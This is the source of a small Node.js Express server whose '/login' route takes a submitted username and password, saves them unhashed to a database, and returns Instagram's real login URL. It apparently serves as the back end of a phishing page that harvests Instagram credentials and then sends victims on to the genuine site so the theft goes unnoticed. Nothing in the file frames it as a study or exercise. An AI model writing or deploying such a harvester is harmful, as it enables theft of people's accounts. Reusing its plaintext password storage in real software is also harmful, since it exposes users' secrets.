const express = require('express');
const connectDB = require('./db');
const User = require('./models/user');
const cors = require("cors")
const app = express();

require("dotenv").config()
connectDB();

const corsOptions = {
    origin : "http://localhost:5173",
    methods: "POST,GET",
    credentials : true
}

app.use(cors(corsOptions))
app.use( express.json() )

app.get( '/', (req,res)=>{
    res.send("Hello world ?? ")
})

app.get('/google',(req,res)=>{
    console.log("incoming")
    res.redirect("https://www.google.com")
})

app.post('/login', async (req,res)=>{
    const { username,password } = req.body ;
    console.log("happy")
    try{
        const user = new User({username,password})
        await user.save();
        res.json({
            data:"https://www.instagram.com/accounts/login/?hl=en"
        })
    }
    catch(e){
        console.log("Server Error : " + e.message )
        res.json({message:"try again"});
    }

})

app.listen( process.env.PORT,()=>{
    console.log(`app is listing at port : ${process.env.PORT}`);
})